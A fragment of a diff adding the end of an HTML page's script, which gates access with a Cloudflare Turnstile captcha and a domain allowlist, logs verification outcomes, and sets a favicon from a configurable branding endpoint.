+        setGateStatus("Complete the verification to continue.", "ready");
+        gate.classList.add("active");
+        const script = document.createElement("script");
+        script.src = "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit";
+        script.async = true;
+        script.defer = true;
+        script.onload = () => {
+          if (!window.turnstile) {
+            sendTraffic("turnstile_load_failed", "blocked", "Turnstile could not load");
+            blockPage("ACCESS DENIED");
+            return;
+          }
+          turnstileWidgetId = window.turnstile.render(turnstileMount, {
+            sitekey: config.security.turnstile.siteKey,
+            callback: async (token) => {
+              setGateStatus("Confirming verification...", "verifying");
+              try {
+                const verified = await verifyToken(token);
+                if (verified) {
+                  sendTraffic("turnstile_verified", "allowed", "Passed launcher captcha");
+                  setGateStatus("Verified. Opening...", "success");
+                  window.setTimeout(loadPage, 350);
+                  return;
+                }
+                sendTraffic("turnstile_verify_failed", "blocked", "Turnstile verification failed");
+                retryTurnstile("Verification failed. Please try again.");
+              } catch (error) {
+                sendTraffic("turnstile_verify_failed", "blocked", "Turnstile verification failed");
+                retryTurnstile("Verification could not be confirmed. Please try again.");
+              }
+            },
+            "error-callback": () => {
+              sendTraffic("turnstile_verify_failed", "blocked", "Turnstile challenge failed");
+              setGateStatus("Verification could not start. Please retry.", "error");
+            },
+            "expired-callback": () => {
+              sendTraffic("turnstile_expired", "blocked", "Turnstile challenge expired");
+              setGateStatus("Verification expired. Please try again.", "error");
+            }
+          });
+        };
+        script.onerror = () => {
+          sendTraffic("turnstile_load_failed", "blocked", "Turnstile could not load");
+          blockPage("ACCESS DENIED");
+        };
+        document.head.appendChild(script);
+      }
+
+      function applyFavicon() {
+        var link = document.getElementById("deuceFavicon");
+        if (!link) {
+          link = document.createElement("link");
+          link.id = "deuceFavicon";
+          link.rel = "icon";
+          document.head.appendChild(link);
+        }
+        var fb = config.favicon || {};
+        var brandingEndpoint = config.runtime?.brandingEndpoint || "";
+        if (brandingEndpoint) {
+          var brandingUrl = new URL(brandingEndpoint, window.location.href);
+          brandingUrl.searchParams.set("hostname", window.location.hostname);
+          brandingUrl.searchParams.set("sessionId", sessionId);
+          link.href = brandingUrl.toString();
+        } else if (fb.thumbnailDataUrl) {
+          link.href = fb.thumbnailDataUrl;
+        }
+      }
+
+      async function boot() {
+        try {
+          await refreshLiveConfig();
+        } catch (error) {
+          sendTraffic("config_load_failed", "blocked", "Live security configuration unavailable");
+          blockPage("SECURITY CONFIGURATION UNAVAILABLE");
+          return;
+        }
+
+        enableContentDeterrence();
+        applyFavicon();
+
+        const allowedHosts = (config.security?.domains || config.allowedDomains || []).map(normalizeHost).filter(Boolean);
+        const captchaRequired = Boolean(config.security?.captchaRequired || config.security?.captcha || config.security?.challengeRequired);
+        const siteKey = config.security?.turnstile?.siteKey || "";
+        if (allowedHosts.length && !allowedHosts.includes(normalizeHost(host))) {
+          blockPage("ACCESS DENIED");
+        } else if (captchaRequired && !siteKey) {
+          sendTraffic("turnstile_config_missing", "blocked", "Turnstile site key is missing");
+          blockPage("SECURITY CONFIGURATION UNAVAILABLE");
+        } else if (captchaRequired) {
+          loadTurnstile();
+        } else {
+          loadPage();
+        }
+      }
+
+      boot();
+    </script>
+  </body>
+</html>
